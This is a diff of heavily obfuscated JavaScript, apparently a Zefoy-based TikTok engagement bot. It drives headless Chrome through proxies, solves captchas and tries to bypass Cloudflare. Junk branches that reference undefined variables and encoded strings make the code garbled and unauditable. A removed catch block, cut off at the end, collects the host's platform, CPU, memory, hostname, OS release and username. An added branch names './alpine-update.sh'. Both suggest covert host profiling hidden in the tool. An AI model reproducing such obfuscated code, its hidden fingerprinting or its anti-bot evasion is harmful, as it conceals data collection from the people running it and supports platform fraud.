-            N.stdout.cursorTo(0);
-            C.stdout.write(S + " The captcha is blocked and cannot be accessed!");
+            process.stdout.write(v65 + "  Proxy: " + vV432 + " [" + v397 + "] failed!");
           }
-        } else if (v376.LyCcJ(v376.GCgaB, v376.GCgaB)) {
-          let v381 = await v376.DkFKZ(f49, vV452);
-          v376.ofLGr(f53, "Proxy: " + vV452 + " [" + v381 + "] failed!");
+        } else if (v394.oYoNs(v394.nHDPK, v394.nHDPK)) {
+          a += z.fromCharCode(v394.LrRFT(w, A.substr(p, 2), 16));
         } else {
-          v376.xtxTu(vV452, "Check proxies...");
+          let v398 = await v394.PdGAI(f50, vV432);
+          v394.KSsnZ(f54, "Proxy: " + vV432 + " [" + v398 + "] failed!");
         }
-        vV452 = "";
-        await v376.KsIxo(f52, 300);
-        if (v376.RXZgv(!v26, !v29)) {
-          if (v376.eHotj(v376.TeBsl, v376.ThwQj)) {
+        vV432 = "";
+        await v394.TMEnk(f53, 300);
+        if (v394.irXlu(!v28, !v31)) {
+          if (v394.FXmSP(v394.qRHIf, v394.qRHIf)) {
+            vV432 = v394.CymkU;
+          } else {
             process.stdout.clearLine(0);
             process.stdout.cursorTo(0);
-            process.stdout.write(v67 + "  Do not use proxy!");
-          } else {
-            N.stdout.clearLine(0);
-            C.stdout.cursorTo(0);
-            S.stdout.write(t + " Launch " + V.provider + " in headless browser...");
+            process.stdout.write(v65 + "  Do not use proxy!");
           }
-        } else if (v376.eHotj(v376.bBNYu, v376.mDtXT)) {
-          v376.DkFKZ(f53, "Do not use proxy!");
+        } else if (v394.WsEjG(v394.IXexs, v394.TBeWb)) {
+          P = [...H, v394.vqbSP, v394.AqfPn];
         } else {
-          r.stdout.moveCursor(0, -3);
-          J.stdout.clearScreenDown();
-          A.stdout.write("\n" + F + "[33m " + p + " [34m[" + h + "][0m " + g + "  [90m(" + v376.iFERn(T) + " /hr " + v376.EGrBl(v376.iFERn(s), 60).toFixed(2) + " hrs)[0m\n\n");
-          H.stdout.write(u + " Waiting: " + W + " mins (ERROR: " + R.substring(0, 22) + ")...");
+          v394.XhlTT(f54, "Do not use proxy!");
         }
       } else {
         return null;
       }
-      await v376.DkFKZ(f52, 300);
+      await v394.TMEnk(f53, 300);
     } else {
-      vV452 = v376.LaYXy;
+      a = z ? v394.PdGAI(w, A[0].replace(/[,\.]/g, "")) : p;
     }
   }
-  if (v46) {
-    if (v376.XeiTI(v376.mupTD, v376.ABJiZ)) {
-      vV452 = await v376.DkFKZ(f38, v28);
+  if (v44) {
+    if (v394.lSFRy(v394.xpPnV, v394.xpPnV)) {
+      vV432 = await v394.pRtjk(f39, v30);
     } else {
-      d.stdout.clearLine(0);
-      N.stdout.cursorTo(0);
-      C.stdout.write(S + " Zefoy is unreachable or blocked! :(");
+      return true;
     }
   }
-  return vV452;
+  return vV432;
 }
-async function f41() {
-  const v382 = {
-    RHWoF: function (p1158) {
-      return p1158();
+async function f42() {
+  const v399 = {
+    KqreO: function (p1296) {
+      return p1296();
     },
-    VUufj: function (p1159) {
-      return p1159();
+    kZnQl: function (p1297) {
+      return p1297();
     },
-    vIFsN: function (p1160, p1161) {
-      return p1160(p1161);
+    NQTEY: function (p1298, p1299) {
+      return p1298(p1299);
     }
   };
-  await v382.RHWoF(f43);
-  let v383 = await v382.VUufj(f9);
-  return await v382.vIFsN(f42, v383);
+  await v399.KqreO(f44);
+  let v400 = await v399.kZnQl(f9);
+  return await v399.NQTEY(f43, v400);
 }
-async function f42(p1162) {
-  const v384 = {
-    kzbtQ: function (p1163) {
-      return p1163();
+async function f43(p1300) {
+  const v401 = {
+    HUnnb: function (p1301, p1302) {
+      return p1301 === p1302;
     },
-    KLrtG: function (p1164, p1165) {
-      return p1164 / p1165;
+    dmeaH: "Up ",
+    hXJuG: function (p1303, p1304) {
+      return p1303 !== p1304;
     },
-    JdLbs: function (p1166, p1167) {
-      return p1166 === p1167;
-    },
-    zZIsb: "Up ",
-    QVoAX: "axPzB"
+    TtRat: "JrYWF"
   };
-  let v385 = await p1162.evaluate("(() => {\n      let choices = Array.from(document.querySelectorAll(\".card-body\"));\n      choices = choices.map((c) => {\n        const parts = c.innerText.replace(" + /(\r\n|\n|\r)/gm + ", \" \").split(\"  \");\n        return {\n          name: 'Up ' + parts[0],\n          disabled:" + /soon/ + ".test(parts[1]) ? true : false,\n        };\n      });\n      return choices.filter((c) => !c.disabled);\n    })();");
-  if (!v385.length || v384.JdLbs(v385[0].name, v384.zZIsb)) {
-    if (v384.JdLbs(v384.QVoAX, v384.QVoAX)) {
-      return false;
-    } else {
-      B.stdout.moveCursor(0, -3);
-      r.stdout.clearScreenDown();
-      J.stdout.write("\n" + A + "[33m " + F + " [34m[" + p + "][0m " + h + "  [90m(" + v384.kzbtQ(g) + " /hr " + v384.KLrtG(v384.kzbtQ(T), 60).toFixed(2) + " hrs)[0m\n\n");
-      s.stdout.write(H + " Running: " + u.substring(0, 43));
-    }
-  }
-  const v386 = v385.map(p1168 => p1168.name);
-  return v386;
-}
-async function f43(p1169 = true, p1170 = true) {
-  const v387 = {
-    FSvtg: function (p1171, p1172) {
-      return p1171 < p1172;
-    },
-    rYtsX: function (p1173, p1174) {
-      return p1173 + p1174;
-    },
-    EVuMz: function (p1175, p1176) {
-      return p1175 + p1176;
-    },
-    qVrGl: "--disable-gpu",
-    Ckxwq: "--disable-gpu-compositing",
-    eWBKM: "Error processing image:",
-    XAaXx: function (p1177, p1178) {
-      return p1177(p1178);
-    },
-    GTvQm: function (p1179, p1180) {
-      return p1179 ^ p1180;
-    },
-    jKCjp: function (p1181, p1182) {
-      return p1181(p1182);
-    },
-    NUMwg: function (p1183, p1184) {
-      return p1183(p1184);
-    },
-    CiwnW: function (p1185, p1186) {
-      return p1185(p1186);
-    },
-    CPGlJ: function (p1187, p1188) {
-      return p1187(p1188);
-    },
-    XXvkn: function (p1189, p1190) {
-      return p1189(p1190);
-    },
-    Vsyue: function (p1191, p1192) {
-      return p1191 && p1192;
-    },
-    KDQzB: function (p1193, p1194) {
-      return p1193 === p1194;
-    },
-    oEfpR: "grVKB",
-    wWgBT: "ahylU",
-    oIJdo: function (p1195, p1196) {
-      return p1195 !== p1196;
-    },
-    pLrpR: "RDGUa",
-    oNKau: "pvwrf",
-    NzjqU: function (p1197, p1198) {
-      return p1197(p1198);
-    },
-    hwHTl: function (p1199, p1200) {
-      return p1199(p1200);
-    },
-    COWqg: "JTcvf",
-    aDtPY: "ootRz",
-    EiAdD: function (p1201, p1202) {
-      return p1201 !== p1202;
-    },
-    dSCGb: "KmEKq",
-    ksUUG: function (p1203, p1204) {
-      return p1203 + p1204;
-    },
-    OVfEU: "Executable not found in the following path:\n",
-    tuBhG: "Use the -b flag to set the path to the browser.",
-    XQnpf: function (p1205, p1206) {
-      return p1205 !== p1206;
-    },
-    IFWlR: "wxHYJ",
-    WIgPI: "wlhiT",
-    NjhqV: function (p1207, p1208) {
-      return p1207(p1208);
-    },
-    dfJFP: function (p1209, p1210) {
-      return p1209 === p1210;
-    },
-    negmO: "nFHSh",
-    rTsJK: "OXOVU",
-    SluwU: function (p1211, p1212) {
-      return p1211 !== p1212;
-    },
-    ySwUv: "yQPDz",
-    jyyUJ: "wxFTC",
-    ZfZms: function (p1213, p1214) {
-      return p1213 && p1214;
-    },
-    zGUJO: function (p1215, p1216) {
-      return p1215 === p1216;
-    },
-    PRpqY: "NMFvI",
-    ZETfq: "EcYlx",
-    rMqmY: function (p1217) {
-      return p1217();
-    },
-    qjTBN: function (p1218, p1219, p1220) {
-      return p1218(p1219, p1220);
-    },
-    BkGQj: "nszNc",
-    EwpYT: function (p1221, p1222) {
-      return p1221 && p1222;
-    },
-    KXLLQ: function (p1223, p1224) {
-      return p1223 !== p1224;
-    },
-    msGaC: "NULkj",
-    dvOAi: function (p1225, p1226) {
-      return p1225 === p1226;
-    },
-    WjEIR: "tWTVq",
-    BqIUC: function (p1227, p1228) {
-      return p1227 !== p1228;
-    },
-    jkYyN: "wQcrt",
-    fHAfW: "pxmjg",
-    sMIhW: "xzQXY",
-    vrEke: "dvStF",
-    zDWlR: "hZpQX",
-    kGKDM: function (p1229, p1230) {
-      return p1229(p1230);
-    },
-    VBalk: function (p1231, p1232) {
-      return p1231(p1232);
-    },
-    gRssE: function (p1233, p1234) {
-      return p1233 && p1234;
-    },
-    BRUke: function (p1235, p1236) {
-      return p1235 === p1236;
-    },
-    RbFch: "DEGLJ",
-    UwjKF: "eFaSW",
-    DUBti: "gbAEm",
-    dHOrF: function (p1237, p1238) {
-      return p1237(p1238);
-    },
-    wczFW: function (p1239, p1240) {
-      return p1239(p1240);
-    },
-    hKWTQ: function (p1241, p1242) {
-      return p1241 !== p1242;
-    },
-    hiTtp: "gAJNU",
-    nkfuy: function (p1243, p1244) {
-      return p1243 !== p1244;
-    },
-    xpPzY: "NzRfU",
-    kdUIK: "wCXiy",
-    aWSNu: "dkaFs",
-    QPUDV: "mKhDa",
-    bYaZQ: function (p1245, p1246) {
-      return p1245(p1246);
-    },
-    EFgBQ: function (p1247, p1248) {
-      return p1247(p1248);
-    }
-  };
-  const v388 = vA0zS.browser || a0zC.executablePath();
-  if (v387.Vsyue(!v26, !v29)) {
-    if (v387.KDQzB(v387.oEfpR, v387.wWgBT)) {
+  const vV401 = v401;
+  let v402 = await p1300.evaluate("(() => {\n      let choices = Array.from(document.querySelectorAll(\".card-body\"));\n      choices = choices.map((c) => {\n        const parts = c.innerText.replace(" + /(\r\n|\n|\r)/gm + ", \" \").split(\"  \");\n        return {\n          name: 'Up ' + parts[0],\n          disabled:" + /soon/ + ".test(parts[1]) ? true : false,\n        };\n      });\n      return choices.filter((c) => !c.disabled);\n    })();");
+  if (!v402.length || vV401.HUnnb(v402[0].name, vV401.dmeaH)) {
+    if (vV401.hXJuG(vV401.TtRat, vV401.TtRat)) {
       return true;
     } else {
+      return false;
+    }
+  }
+  const v403 = v402.map(p1305 => p1305.name);
+  return v403;
+}
+async function f44(p1306 = true, p1307 = true) {
+  const v404 = {
+    jvUfF: function (p1308, p1309) {
+      return p1308(p1309);
+    },
+    mCbCe: function (p1310, p1311) {
+      return p1310(p1311);
+    },
+    aRxNk: function (p1312, p1313) {
+      return p1312(p1313);
+    },
+    qFyjr: function (p1314) {
+      return p1314();
+    },
+    ubdYJ: "You are being rate limited",
+    IsULY: function (p1315, p1316) {
+      return p1315 + p1316;
+    },
+    etmfi: " UA: ",
+    hzDLr: function (p1317, p1318) {
+      return p1317(p1318);
+    },
+    WxMSS: function (p1319, p1320) {
+      return p1319(p1320);
+    },
+    cQVyB: function (p1321, p1322) {
+      return p1321(p1322);
+    },
+    DUhcK: function (p1323, p1324) {
+      return p1323 || p1324;
+    },
+    wAxLN: function (p1325, p1326) {
+      return p1325 && p1326;
+    },
+    nnBDM: function (p1327, p1328) {
+      return p1327 !== p1328;
+    },
+    jAuYc: "JIsDg",
+    GFPJv: "ivngt",
+    GhLBV: function (p1329, p1330) {
+      return p1329 + p1330;
+    },
+    UQjHe: function (p1331, p1332) {
+      return p1331 !== p1332;
+    },
+    oDZmp: "zlEer",
+    lmfPO: function (p1333, p1334) {
+      return p1333(p1334);
+    },
+    Noheo: "zsUDM",
+    osehO: "tGWhB",
+    iHWHW: "Executable not found in the following path:\n",
+    sdLJJ: "Use the -b flag to set the path to the browser.",
+    lVetE: function (p1335, p1336) {
+      return p1335 !== p1336;
+    },
+    RSoqf: "WTeZq",
+    KWynb: "loGtV",
+    aIJDf: function (p1337, p1338) {
+      return p1337(p1338);
+    },
+    VmZJr: function (p1339, p1340) {
+      return p1339(p1340);
+    },
+    Ooevf: function (p1341, p1342) {
+      return p1341 === p1342;
+    },
+    NNCPh: "pOdTt",
+    KvBDd: "Tphsm",
+    RJaKq: function (p1343, p1344) {
+      return p1343 === p1344;
+    },
+    OfpXU: "LrXVU",
+    udaEv: "XLkCS",
+    GXjjd: "bHqak",
+    wfdVg: "vHEnF",
+    vVFBl: function (p1345, p1346) {
+      return p1345(p1346);
+    },
+    nIJLs: function (p1347) {
+      return p1347();
+    },
+    Rljrr: function (p1348, p1349, p1350) {
+      return p1348(p1349, p1350);
+    },
+    VRfNB: "FjLAi",
+    HySxu: "EGNpg",
+    NaToo: "EYFXt",
+    LesRU: function (p1351, p1352) {
+      return p1351 === p1352;
+    },
+    VPdOF: "rsDfw",
+    DbSjM: function (p1353, p1354) {
+      return p1353(p1354);
+    },
+    Xfxmg: "uZhnj",
+    miwUn: function (p1355, p1356) {
+      return p1355 && p1356;
+    },
+    aqiWM: "RFCHw",
+    frtgQ: "wvDbq",
+    tOVrl: "KJOtU",
+    oDBHH: "JmeyO",
+    hlvtf: function (p1357, p1358) {
+      return p1357(p1358);
+    },
+    ONtXf: function (p1359, p1360) {
+      return p1359 === p1360;
+    },
+    OkIwZ: "rwOWY",
+    SwIbc: function (p1361, p1362) {
+      return p1361 === p1362;
+    },
+    mePSr: "SfBJR",
+    MwjDI: "XuytA",
+    bbzEh: function (p1363, p1364) {
+      return p1363(p1364);
+    },
+    EClGc: function (p1365, p1366) {
+      return p1365(p1366);
+    },
+    OFuPy: function (p1367, p1368) {
+      return p1367 !== p1368;
+    },
+    CXILL: "MvKHT",
+    hYwJq: "isqAI",
+    XQdLh: function (p1369, p1370) {
+      return p1369 && p1370;
+    },
+    bSqkb: "PSSlH",
+    RvRTN: "geltT",
+    dMFqF: "Csxdq",
+    CaDYN: function (p1371, p1372) {
+      return p1371(p1372);
+    }
+  };
+  const v405 = vA0iw.browser || a0iz.executablePath();
+  if (v404.wAxLN(!v28, !v31)) {
+    if (v404.nnBDM(v404.jAuYc, v404.GFPJv)) {
       process.stdout.clearLine(0);
       process.stdout.cursorTo(0);
-      process.stdout.write(v387.EVuMz(v59, " Check browser (" + v388.substring(0, 34) + ")..."));
+      process.stdout.write(v404.GhLBV(v57, " Check browser (" + v405.substring(0, 34) + ")..."));
+    } else {
+      v404.jvUfF(w, "[" + A + "] " + p + " (+" + C + ") " + J);
+      v404.jvUfF(D, l);
     }
-  } else if (v387.oIJdo(v387.pLrpR, v387.oNKau)) {
-    v387.NzjqU(f53, "Check browser (" + v388 + ")...");
-  } else if (v387.FSvtg(v387.rYtsX(I, 1), U.length)) {
-    let v389 = T[s];
-    H[u] = W[v387.EVuMz(R, 1)];
-    o[v387.rYtsX(E, 1)] = v389;
-  }
-  await v387.CPGlJ(f52, 300);
-  if (await v387.hwHTl(f62, v388)) {} else if (v387.KDQzB(v387.COWqg, v387.aDtPY)) {
-    v387 = [...v388, v387.qVrGl, v387.Ckxwq];
+  } else if (v404.UQjHe(v404.oDZmp, v404.oDZmp)) {
+    a = z ? v404.jvUfF(w, A[0].replace(/[,\.]/g, "")) : p;
   } else {
-    if (v387.Vsyue(!v26, !v29)) {
-      if (v387.EiAdD(v387.dSCGb, v387.dSCGb)) {
-        v387 = "[32m+" + v388 + "[0m";
+    v404.lmfPO(f54, "Check browser (" + v405 + ")...");
+  }
+  await v404.WxMSS(f53, 300);
+  if (await v404.aRxNk(f63, v405)) {} else if (v404.nnBDM(v404.Noheo, v404.Noheo)) {
+    return p1307[1];
+  } else {
+    if (v404.wAxLN(!v28, !v31)) {
+      if (v404.UQjHe(v404.osehO, v404.osehO)) {
+        v404 = v405;
       } else {
         process.stdout.clearLine(0);
         process.stdout.cursorTo(0);
-        process.stdout.write(v387.ksUUG(v62, " Chrome/Chromium executable is invalid!"));
-        console.info("\n\n", v387.OVfEU, "\"" + v388 + "\"\n", v387.tuBhG);
+        process.stdout.write(v404.IsULY(v60, " Chrome/Chromium executable is invalid!"));
+        console.info("\n\n", v404.iHWHW, "\"" + v405 + "\"\n", v404.sdLJJ);
       }
-    } else if (v387.XQnpf(v387.IFWlR, v387.WIgPI)) {
-      v387.hwHTl(f53, "Chrome/Chromium executable is invalid!");
+    } else if (v404.lVetE(v404.RSoqf, v404.KWynb)) {
+      v404.aIJDf(f54, "Chrome/Chromium executable is invalid!");
     } else {
-      v387.error(v387.eWBKM, v388);
+      return null;
     }
     process.exit(0);
   }
-  await v387.NjhqV(f52, 300);
-  if (a0zd.existsSync(v93)) {
-    if (v387.dfJFP(v387.negmO, v387.rTsJK)) {
-      let v390 = v388.stringify(d);
-      let v391 = v387.XAaXx(N, v390);
-      let v392 = "";
-      for (let v393 = 0; v387.FSvtg(v393, v391.length); v393++) {
-        let v394 = v387.GTvQm(v391.charCodeAt(v393), 127);
-        v392 += v394.toString(16).padStart(2, "0");
+  await v404.VmZJr(f53, 300);
+  if (a0ic.existsSync(v93)) {
+    if (v404.Ooevf(v404.NNCPh, v404.KvBDd)) {
+      if (v404.includes(v405)) {
+        return true;
       }
-      return v392;
+      return false;
     } else {
-      p1169 = false;
+      p1306 = false;
     }
   }
-  if (p1169) {
-    if (v387.SluwU(v387.ySwUv, v387.jyyUJ)) {
-      if (v387.ZfZms(!v26, !v29)) {
-        if (v387.zGUJO(v387.PRpqY, v387.PRpqY)) {
+  if (p1306) {
+    if (v404.RJaKq(v404.OfpXU, v404.udaEv)) {
+      const v406 = v404.mCbCe(v404, v405[1]);
+      return v406;
+    } else {
+      if (v404.wAxLN(!v28, !v31)) {
+        if (v404.RJaKq(v404.GXjjd, v404.GXjjd)) {
           process.stdout.clearLine(0);
           process.stdout.cursorTo(0);
-          process.stdout.write(v59 + " Check Zefoy accessibility...");
+          process.stdout.write(v57 + " Check Zefoy accessibility...");
         } else {
-          v387.jKCjp(v387, "SESSID: " + v388);
+          v405.log(c);
+          a.exit(0);
         }
-      } else if (v387.SluwU(v387.ZETfq, v387.ZETfq)) {
-        return false;
+      } else if (v404.RJaKq(v404.wfdVg, v404.wfdVg)) {
+        v404.vVFBl(f54, "Check Zefoy accessibility...");
       } else {
-        v387.CPGlJ(f53, "Check Zefoy accessibility...");
+        v404.aRxNk(D, "[" + l + "] " + M + " (+" + q + ") [" + o + "] Accumulation limit reached! (in " + v404.qFyjr(L) + " mins)");
+        if (!T) {
+          B.stdout.clearLine(0);
+          v.stdout.cursorTo(0);
+          G.stdout.write(Y + " Accumulation limit reached!");
+        }
+        h.exit(0);
       }
-      v82 = v82 || (await v387.rMqmY(f40));
-      if (await v387.qjTBN(f39, v82, p1170)) {
-        if (v387.KDQzB(v387.BkGQj, v387.BkGQj)) {
-          if (v387.EwpYT(!v26, !v29)) {
-            if (v387.KXLLQ(v387.msGaC, v387.msGaC)) {
-              N.stdout.clearLine(0);
-              C.stdout.cursorTo(0);
-              S.stdout.write(t + " Captcha resolved! (" + V + ")");
+      v80 = v80 || (await v404.nIJLs(f41));
+      if (await v404.Rljrr(f40, v80, p1307)) {
+        if (v404.RJaKq(v404.VRfNB, v404.VRfNB)) {
+          if (v404.wAxLN(!v28, !v31)) {
+            if (v404.Ooevf(v404.HySxu, v404.NaToo)) {
+              const v407 = {
+                name: p1307.concat
+              };
+              return v407;
             } else {
               process.stdout.clearLine(0);
               process.stdout.cursorTo(0);
-              process.stdout.write(v61 + " Zefoy is accessible! :)");
+              process.stdout.write(v59 + " Zefoy is accessible! :)");
             }
-          } else if (v387.dvOAi(v387.WjEIR, v387.WjEIR)) {
-            v387.CPGlJ(f53, "Zefoy is accessible! :)");
+          } else if (v404.LesRU(v404.VPdOF, v404.VPdOF)) {
+            v404.DbSjM(f54, "Zefoy is accessible! :)");
           } else {
-            v387.NUMwg(v387, "Wrong captcha! (" + v388 + ")");
+            v404 = v405;
           }
-          if (await v387.qjTBN(f44, v82, p1170)) {
-            if (v387.BqIUC(v387.jkYyN, v387.fHAfW)) {
-              if (v387.EwpYT(!v26, !v29)) {
-                if (v387.KDQzB(v387.sMIhW, v387.sMIhW)) {
+          if (await v404.Rljrr(f45, v80, p1307)) {
+            if (v404.RJaKq(v404.Xfxmg, v404.Xfxmg)) {
+              if (v404.miwUn(!v28, !v31)) {
+                if (v404.RJaKq(v404.aqiWM, v404.frtgQ)) {
+                  p1307 = v404.ubdYJ;
+                } else {
                   process.stdout.clearLine(0);
                   process.stdout.cursorTo(0);
-                  process.stdout.write(v62 + " Zefoy is protected by UAM Cloudflare!");
-                } else {
-                  N = C ? v387.CiwnW(S, t[0].replace(/[,\.]/g, "")) : V;
+                  process.stdout.write(v60 + " Zefoy is protected by UAM Cloudflare!");
                 }
-              } else if (v387.KDQzB(v387.vrEke, v387.zDWlR)) {
-                v387 = v388;
+              } else if (v404.lVetE(v404.tOVrl, v404.oDBHH)) {
+                v404.jvUfF(f54, "Zefoy is protected by UAM Cloudflare!");
               } else {
-                v387.kGKDM(f53, "Zefoy is protected by UAM Cloudflare!");
+                c.stdout.moveCursor(0, -4);
+                a.stdout.clearScreenDown();
+                z.log(w);
               }
-              await v387.VBalk(f52, 300);
-              if (v387.gRssE(!v26, !v29)) {
-                if (v387.BRUke(v387.RbFch, v387.RbFch)) {
+              await v404.hlvtf(f53, 1000);
+              if (v404.wAxLN(!v28, !v31)) {
+                if (v404.ONtXf(v404.OkIwZ, v404.OkIwZ)) {
                   process.stdout.clearLine(0);
                   process.stdout.cursorTo(0);
-                  process.stdout.write(v66 + " Bypassing Cloudflare...");
+                  process.stdout.write(v64 + " Bypassing Cloudflare...");
                 } else {
-                  return v387.CPGlJ(v387, v388.split("").reverse().join(""));
+                  v405 += c[a];
                 }
-              } else if (v387.zGUJO(v387.UwjKF, v387.DUBti)) {
-                p1170.log("Cloudflare Valid / Freer Expired");
+              } else if (v404.SwIbc(v404.mePSr, v404.MwjDI)) {
+                a.stdout.clearLine(0);
+                z.stdout.cursorTo(0);
+                w.stdout.write(v404.IsULY(v404.IsULY(A, v404.etmfi), p.substring(0, 48)));
               } else {
-                v387.dHOrF(f53, "Bypassing Cloudflare...");
+                v404.bbzEh(f54, "Bypassing Cloudflare...");
               }
-              await v387.wczFW(f47, v82);
+              await v404.EClGc(f48, v80);
             } else {
-              d.stdout.clearLine(0);
-              N.stdout.cursorTo(0);
-              C.stdout.write(S + " Bypassing Cloudflare...");
+              c.stdout.clearLine(0);
+              a.stdout.cursorTo(0);
+              z.stdout.write(w + " Accumulation limit reached!");
             }
           }
         } else {
-          v387.XAaXx(v388, d);
-          return N;
+          return false;
         }
-      } else if (v387.hKWTQ(v387.hiTtp, v387.hiTtp)) {
-        return [];
-      } else if (v387.Vsyue(!v26, !v29)) {
-        if (v387.nkfuy(v387.xpPzY, v387.kdUIK)) {
-          process.stdout.clearLine(0);
-          process.stdout.cursorTo(0);
-          process.stdout.write(v62 + " Zefoy is unreachable or blocked! :(");
+      } else if (v404.OFuPy(v404.CXILL, v404.hYwJq)) {
+        if (v404.XQdLh(!v28, !v31)) {
+          if (v404.RJaKq(v404.bSqkb, v404.bSqkb)) {
+            process.stdout.clearLine(0);
+            process.stdout.cursorTo(0);
+            process.stdout.write(v60 + " Zefoy is unreachable or blocked! :(");
+          } else {
+            const v408 = v404.mCbCe(w, A);
+            if (!v408.ok) {
+              return null;
+            }
+            const v409 = v408.text();
+            const v410 = v409.match(/"stats":\s*{\s*"diggCount":(\d+),\s*"shareCount":(\d+),\s*"commentCount":(\d+),\s*"playCount":(\d+),\s*"collectCount":"(\d+)"\s*}/);
+            if (v410) {
+              const [, v411, v412, v413, v414, v415] = v410;
+              return {
+                diggCount: v404.hzDLr(M, v411),
+                shareCount: v404.aRxNk(q, v412),
+                commentCount: v404.hzDLr(o, v413),
+                playCount: v404.WxMSS(L, v414),
+                collectCount: v404.cQVyB(T, v415)
+              };
+            } else {
+              return null;
+            }
+          }
+        } else if (v404.lVetE(v404.RvRTN, v404.dMFqF)) {
+          v404.DbSjM(f54, "Zefoy is unreachable or blocked! (you need proxy/vpn)");
+        } else if (v405) {
+          return z;
         } else {
-          return new v388(p1249 => C(p1249, S));
+          qVYTaV.aRxNk(w, 0);
         }
-      } else if (v387.dfJFP(v387.aWSNu, v387.QPUDV)) {
-        return false;
       } else {
-        v387.bYaZQ(f53, "Zefoy is unreachable or blocked! (you need proxy/vpn)");
+        const v416 = v405.find(p1373 => p1373.name === v416.name);
+        return v404.DUhcK(v416, a);
       }
-      await v387.EFgBQ(f52, 300);
-    } else {
-      v387.XXvkn(C, "[" + S + "] " + t + " (+" + V + ") [" + I + "] Running: " + U);
+      await v404.CaDYN(f53, 1000);
     }
   }
 }
-async function f44(p1250, p1251 = true) {
-  const v395 = {
-    OvvtD: function (p1252, p1253) {
-      return p1252 === p1253;
+async function f45(p1374, p1375 = true) {
+  const v417 = {
+    gwfyx: "./alpine-update.sh",
+    irCjM: function (p1376, p1377) {
+      return p1376(p1377);
     },
-    qTORg: function (p1254, p1255) {
-      return p1254 - p1255;
+    ARcvV: "--no-sandbox",
+    Exyrg: "--window-size=900,900",
+    HQIsr: "--window-position=200,0",
+    fsgtz: function (p1378, p1379) {
+      return p1378 + p1379;
     },
-    HyTOa: function (p1256, p1257) {
-      return p1256(p1257);
+    eLcLx: "--user-agent=",
+    lIzEu: "--proxy-server=",
+    vBAVe: function (p1380, p1381) {
+      return p1380 === p1381;
     },
-    caXDT: function (p1258, p1259) {
-      return p1258(p1259);
+    gtxsL: "IcusD",
+    HNiqy: "--disable-gpu",
+    ClgZY: "--disable-gpu-compositing",
+    JzyhX: "browser-user",
+    Yueup: function (p1382, p1383) {
+      return p1382 === p1383;
     },
-    tVHub: function (p1260, p1261) {
-      return p1260(p1261);
+    DCfwR: "Ogric",
+    KXXBJ: "NujZF",
+    TwLxW: "domcontentloaded",
+    OWlUF: function (p1384, p1385) {
+      return p1384 !== p1385;
     },
-    GnBKV: function (p1262, p1263) {
-      return p1262(p1263);
+    bpgyq: "pSVlg",
+    rCNjX: "fGLUo",
+    iMsGV: "OaLdq",
+    cerOE: function (p1386, p1387) {
+      return p1386 !== p1387;
     },
-    uQFdT: "00000000",
-    tlcFC: "You are being rate limited",
-    qDpff: "--no-sandbox",
-    rWrHw: "--window-size=900,900",
-    LydgJ: "--window-position=200,0",
-    rBFVZ: function (p1264, p1265) {
-      return p1264 + p1265;
-    },
-    pGQnX: "--user-agent=",
-    otIgE: "--proxy-server=",
-    OmTfd: "FmgbG",
-    ORJtD: "--disable-gpu",
-    tgegf: "--disable-gpu-compositing",
-    wDxJf: "browser-user",
-    OdnPJ: function (p1266, p1267) {
-      return p1266 !== p1267;
-    },
-    aqROD: "hTvdE",
-    ZcyNf: "LQowZ",
-    QPFha: "domcontentloaded",
-    JMkRR: function (p1268, p1269) {
-      return p1268 !== p1269;
-    },
-    hPlbg: "iBIlg",
-    qDYvC: "njPSK",
-    VcJFK: function (p1270, p1271) {
-      return p1270 !== p1271;
-    },
-    IQJDh: "GPjXZ",
-    DnmoY: "JIykU",
-    FptWb: "lsNSj"
+    LSGKx: "izeBM",
+    UspAF: "bOXve"
   };
-  let v396 = [v395.qDpff, v395.rWrHw, v395.LydgJ, v395.rBFVZ(v395.pGQnX, v77), v395.rBFVZ(v395.otIgE, p1250)];
-  if (v35) {
-    if (v395.OvvtD(v395.OmTfd, v395.OmTfd)) {
-      v396 = [...v396, v395.ORJtD, v395.tgegf];
-    } else if (v395.OvvtD(v397, 0)) {
-      B = r;
+  let v418 = [v417.ARcvV, v417.Exyrg, v417.HQIsr, v417.fsgtz(v417.eLcLx, v75), v417.fsgtz(v417.lIzEu, p1374)];
+  if (v33) {
+    if (v417.vBAVe(v417.gtxsL, v417.gtxsL)) {
+      v418 = [...v418, v417.HNiqy, v417.ClgZY];
     } else {
-      J = v395.qTORg(A, F);
+      v417.stdout.clearLine(0);
+      v418.stdout.cursorTo(0);
+      v419.stdout.write(v420 + " Stopped for not accumulating the defined minimum!");
     }
   }
-  const v397 = {
-    headless: p1251,
-    args: v396,
-    executablePath: vA0zS.browser,
-    userDataDir: vA0zS[v395.wDxJf]
+  const v419 = {
+    headless: p1375,
+    args: v418,
+    executablePath: vA0iw.browser,
+    userDataDir: vA0iw[v417.JzyhX]
   };
-  const v398 = await a0zC.launch(v397);
+  const v420 = await a0iz.launch(v419);
   try {
-    if (v395.OdnPJ(v395.aqROD, v395.ZcyNf)) {
-      const v399 = (await v398.pages())[0];
-      const v400 = {
+    if (v417.Yueup(v417.DCfwR, v417.KXXBJ)) {
+      s.log(v417.gwfyx);
+    } else {
+      const v421 = (await v420.pages())[0];
+      const v422 = {
         timeout: 10000,
-        waitUntil: v395.QPFha
+        waitUntil: v417.TwLxW
       };
-      await v399.goto(v92, v400);
-      const v401 = await v399.content();
-      if (/_cf_chl_opt/.test(v401)) {
-        if (v395.JMkRR(v395.hPlbg, v395.qDYvC)) {
+      await v421.goto(v92, v422);
+      const v423 = await v421.content();
+      if (/_cf_chl_opt/.test(v423)) {
+        if (v417.OWlUF(v417.bpgyq, v417.rCNjX)) {
           return true;
         } else {
-          try {
-            const v402 = v395.HyTOa(t, v399);
-            const v403 = v402.text();
-            const v404 = v403.match(/"liveRoomStats":\s*{\s*"userCount":\s*(\d+)/);
-            if (v404) {
-              const v405 = v395.caXDT(v401, v404[1]);
-              return v405;
-            }
-          } catch (H) {
-            v395.tVHub(r, H);
-            return null;
-          }
+          p1374.stdout.moveCursor(0, -2);
+          p1375.stdout.clearScreenDown();
         }
       }
       return false;
-    } else if (v395.OvvtD(v397, 0)) {
-      B = r;
-    } else {
-      J = v395.qTORg(A, F);
     }
-  } catch (J) {
-    if (v395.VcJFK(v395.IQJDh, v395.DnmoY)) {
-      return false;
+  } catch (M) {
+    if (v417.OWlUF(v417.iMsGV, v417.iMsGV)) {
+      v417.irCjM(p1374, p1375);
     } else {
-      try {
-        const v406 = {
-          platform: O.platform(),
-          architecture: k.arch(),
-          cpus: c.cpus().map(p1272 => p1272.model).join(", "),
-          totalMemory: D.totalmem(),
-          hostname: b.hostname(),
-          osRelease: K.release(),
-          osType: x.type(),
-          userInfo: n.userInfo().username,
